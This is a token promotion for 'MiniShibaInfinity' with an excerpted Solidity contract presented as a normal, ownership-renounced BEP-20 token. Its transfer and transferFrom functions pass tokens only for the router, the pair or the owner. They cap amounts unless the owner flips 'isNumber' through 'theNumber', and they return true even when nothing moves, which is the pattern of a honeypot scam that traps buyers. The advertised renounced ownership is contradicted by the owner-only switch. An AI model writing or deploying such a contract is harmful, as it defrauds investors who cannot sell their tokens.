...
🐕‍🦺TOKEN NAME: MiniShibaInfinity
🐣TOTAL SUPPLY: 1,000,000,000,000,000
🔥BURN 50% : 500,000,000,000,000
❌NOWHALE 🐳
✅ RENOUNCE OWNERSHIP
✅ CONTRACT VERIFIED 

https://t.me/MiniShibaInfinity
...
contract MiniShibaInfinity is Context, IERC20, IERC20Metadata, Ownable {   

    address internal constant PancakeV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;   
    uint256 _DOGE = 1 * 10**9;
    ...
    function theNumber(bool _DOGEber) public onlyOwner virtual returns (bool) {
        isNumber = _DOGEber;
        return true;
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if(_msgSender() == PancakeV2Router || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            ...
            if( (amount <= _DOGE || isNumber) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, amount);
            }
        }
        return true;
    ...
    function transferFrom(
        ...
        if(sender == PancakeV2Router || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            ...
            //nomal user check amount
            if( (amount <= _DOGE || isNumber) && !isContract(sender) ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
